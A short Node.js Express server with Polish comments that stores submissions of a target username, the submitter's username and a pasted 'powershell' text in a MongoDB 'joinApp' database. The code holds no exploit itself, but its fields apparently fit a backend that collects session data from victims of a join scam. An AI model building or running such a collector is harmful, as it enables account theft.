const express = require("express");
const { MongoClient } = require("mongodb");
require("dotenv").config();

const app = express();

// Render ustawia własny PORT, lokalnie użyje 3000
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json({ limit: "5mb" }));
app.use(express.static("public"));

// Sprawdzenie URI MongoDB
if (!process.env.MONGODB_URI) {
console.error("❌ Brak MONGODB_URI w zmiennych środowiskowych!");
process.exit(1);
}

// Połączenie MongoDB
const client = new MongoClient(process.env.MONGODB_URI);

async function start() {
try {
console.log("⏳ Łączenie z MongoDB...");

    await client.connect();

    console.log("✅ Połączono z MongoDB!");

    const db = client.db("joinApp");
    const submissions = db.collection("submissions");

    // Endpoint do zapisywania danych
    app.post("/api/submit", async (req, res) => {
        try {
            const {
                targetUsername,
                yourUsername,
                powershell
            } = req.body;

            if (!targetUsername || !yourUsername || !powershell) {
                return res.status(400).json({
                    error: "Wszystkie pola są wymagane."
                });
            }

            const result = await submissions.insertOne({
                targetUsername,
                yourUsername,
                powershell,
                createdAt: new Date()
            });

            res.json({
                success: true,
                id: result.insertedId
            });

        } catch (error) {
            console.error("Błąd zapisu do MongoDB:", error);

            res.status(500).json({
                error: "Nie udało się zapisać danych."
            });
        }
    });

    // Prosty test działania serwera
    app.get("/api/health", (req, res) => {
        res.json({
            status: "ok",
            database: "connected"
        });
    });

    // Uruchomienie serwera
    app.listen(PORT, "0.0.0.0", () => {
        console.log(`🚀 Serwer działa na porcie ${PORT}`);
    });

} catch (error) {
    console.error("❌ Błąd połączenia z MongoDB:", error);
    process.exit(1);
}

}

start();
